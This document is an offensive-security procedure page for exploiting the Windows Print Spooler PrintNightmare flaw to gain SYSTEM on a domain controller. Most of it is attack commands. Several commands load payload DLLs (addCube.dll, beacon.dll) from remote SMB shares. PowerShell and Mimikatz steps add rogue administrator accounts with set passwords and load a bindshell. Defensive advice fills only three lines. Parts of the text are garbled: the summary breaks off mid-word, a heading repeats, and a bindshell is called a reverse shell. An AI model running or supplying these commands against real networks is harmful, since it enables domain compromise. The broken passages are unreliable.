---
id: ee77d3b7-e08e-43fc-8646-8e355831027e
name: Exploiting PrintNightmare to gain SYSTEM shell on DC
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:02.986236+00:00'
updated_at: '2023-04-10T20:26:14.524681+00:00'
tactics:
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]'
- '[[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]'
tags:
- '[[Active Directory Attacks]]'
- '[[From CVE to SYSTEM shell on DC]]'
- '[[PrintNightmare]]'
commands:
- '[[Add user adm1n/P@ssw0rd in the local admin group by default and execute bindshell.dll]]'
- '[[Exploit CVE-2021-1675 to copy addCube.dll to target machine]]'
- '[[Exploit CVE-2021-1675 to upload addCube.dll to target machine]]'
- '[[Exploit target with payload DLL]]'
- '[[LPE using SharpPrintNightmare.exe]]'
- '[[misc::printnightmare]]'
- '[[misc::printnightmare]]'
- '[[RCE using existing context using SharpPrintNightmare.exe]]'
- '[[RCE using runas /netonly using SharpPrintNightmare.exe]]'
---

# Exploiting PrintNightmare to gain SYSTEM shell on DC

## Summary

This procedure outlines the steps to exploit the PrintNightmare vulnerability (CVE-2021-34527) to gain SYSTEM shell on a Domain Controller. By leveraging a remote code execution vulnerability in the Windows Print Spooler service, an attacker can execute arbitrary code with SYSTEM privileges on a ta

## Description

# Description

This procedure outlines the steps to exploit the PrintNightmare vulnerability (CVE-2021-34527) to gain SYSTEM shell on a Domain Controller. By leveraging a remote code execution vulnerability in the Windows Print Spooler service, an attacker can execute arbitrary code with SYSTEM privileges on a target machine. This can be used to move laterally within the network and gain access to sensitive information. The technical steps involve using a combination of publicly available tools and scripts to exploit the vulnerability and gain access to the target system. The business value of this procedure is to highlight the importance of patching and securing critical systems such as Domain Controllers.

## Requirements

1. Access to a vulnerable Windows Print Spooler service

1. Credentials with administrative privileges on the target system

1. Tools such as SharpNightmare and Mimikatz

## Defense

1. Apply the latest security patches to all critical systems

1. Disable the Windows Print Spooler service on systems where it is not needed

1. Implement network segmentation to limit lateral movement within the network

## Objectives

1. Gain SYSTEM shell access on a Domain Controller

1. Move laterally within the network

1. Access sensitive information

# Instructions

1. To exploit CVE-2021-1675 using SharpNightmare, follow these steps:
1. Download and install the modified Impacket from https://github.com/cube0x0/impacket.
2. Run the following command to execute the exploit and achieve LPE: 
   SharpPrintNightmare.exe C:\addCube.dll
3. To achieve RCE using existing context, run the following command: 
   SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_addb31f9bff9e936\Amd64\UNIDRV.DLL' '\\192.168.1.20'
4. To achieve RCE using runas /netonly, run the following command: 
   SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll'  'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL' '\\192.168.1.10' hackit.local domain_user Pass123

**Code**: [[# require a modified Impacket: https://github.com/]]

> This JSON object provides instructions for exploiting CVE-2021-1675 using SharpNightmare. The 'name' field provides a descriptive name for the exploit. The 'data' field contains the actual commands to run the exploit. The 'lang' field specifies the programming language used for the exploit. The 'text' field provides a link to the GitHub repository for SharpNightmare. The 'instruction' field provides step-by-step instructions for running the exploit. The 'explain' field provides a brief explanation of the JSON object.

**Command** ([[Exploit CVE-2021-1675 to upload addCube.dll to target machine]]):

```bash
python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
```

**Command** ([[Exploit CVE-2021-1675 to copy addCube.dll to target machine]]):

```bash
python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
```

**Command** ([[LPE using SharpPrintNightmare.exe]]):

```bash
SharpPrintNightmare.exe C:\addCube.dll
```

**Command** ([[RCE using existing context using SharpPrintNightmare.exe]]):

```bash
SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_addb31f9bff9e936\Amd64\UNIDRV.DLL' '\\192.168.1.20'
```

**Command** ([[RCE using runas /netonly using SharpPrintNightmare.exe]]):

```bash
SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll'  'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL' '\\192.168.1.10' hackit.local domain_user Pass123
```

2. The above commands are used to exploit CVE-2021-1675 vulnerability to add a new user 'd3m3nt0r' with password 'AzkabanUnleashed123*' and add them to the local admin group. The last command is used to load a bindshell DLL to establish a reverse shell connection to the attacker's machine.

**Code**: [[## LPE only (PS1 + DLL)
Import-Module .\cve-2021-1]]

> The first command imports the PowerShell module 'cve-2021-1675.ps1'. The second command adds a new user 'adm1n' with password 'P@ssw0rd' to the local admin group. The third command adds a new user 'd3m3nt0r' with password 'AzkabanUnleashed123*' to the local admin group. The fourth command loads a bindshell DLL located at 'C:\absolute\path\to\your\bindshell.dll' which establishes a reverse shell connection to the attacker's machine.

**Command** ([[Add user adm1n/P@ssw0rd in the local admin group by default and execute bindshell.dll]]):

```bash
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default
Invoke-Nightmare -DriverName "Dementor" -NewUser "d3m3nt0r" -NewPassword "AzkabanUnleashed123*" 
Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
```

3. Execute the PrintNightmare command using Mimikatz to exploit a vulnerability in the Windows Print Spooler service. The command can be used to perform both Local Privilege Escalation (LPE) and Remote Code Execution (RCE) attacks. The LPE attack can be performed by specifying the target server and the path to the malicious DLL file. The RCE attack can be performed by specifying the target server, the path to the malicious DLL file, and the authentication credentials.

**Code**: [[## LPE
misc::printnightmare /server:DC01 /library:]]

> The 'misc::printnightmare' command is used to exploit a vulnerability in the Windows Print Spooler service. The '/server' argument is used to specify the target server. The '/library' argument is used to specify the path to the malicious DLL file. The '/authdomain', '/authuser', and '/authpassword' arguments are used to specify the authentication credentials for the target server. The '/try' argument is used to specify the number of times the command should be retried in case of failure. The command can be used to perform both Local Privilege Escalation (LPE) and Remote Code Execution (RCE) attacks.

**Command** ([[misc::printnightmare]]):

```bash
/server:DC01 /library:C:\Users\user1\Documents\mimispool.dll
```

**Command** ([[misc::printnightmare]]):

```bash
/server:CASTLE /library:\\10.0.2.12\smb\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50
```

4. This command is used to exploit the PrintNightmare vulnerability on a target machine. The command requires the target IP or hostname and the UNC path to the payload DLL. Optionally, you can provide the domain, username, and password for authentication.

**Code**: [[PrintNightmare [target ip or hostname] [UNC path t]]

> - [target ip or hostname]: The IP address or hostname of the target machine.
- [UNC path to payload Dll]: The UNC path to the payload DLL that will be executed on the target machine.
- [optional domain]: The domain of the target machine.
- [optional username]: The username for authentication.
- [optional password]: The password for authentication.

**Command** ([[Exploit target with payload DLL]]):

```bash
PrintNightmare [target ip or hostname] [UNC path to payload Dll] [optional domain] [optional username] [optional password]
```

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement|TA0008 - Lateral Movement]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]
- [[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]

## Commands Used

- [[Add user adm1n/P@ssw0rd in the local admin group by default and execute bindshell.dll]]
- [[Exploit CVE-2021-1675 to copy addCube.dll to target machine]]
- [[Exploit CVE-2021-1675 to upload addCube.dll to target machine]]
- [[Exploit target with payload DLL]]
- [[LPE using SharpPrintNightmare.exe]]
- [[misc::printnightmare]]
- [[misc::printnightmare]]
- [[RCE using existing context using SharpPrintNightmare.exe]]
- [[RCE using runas /netonly using SharpPrintNightmare.exe]]

## Tags

- [[Active Directory Attacks]]
- [[From CVE to SYSTEM shell on DC]]
- [[PrintNightmare]]
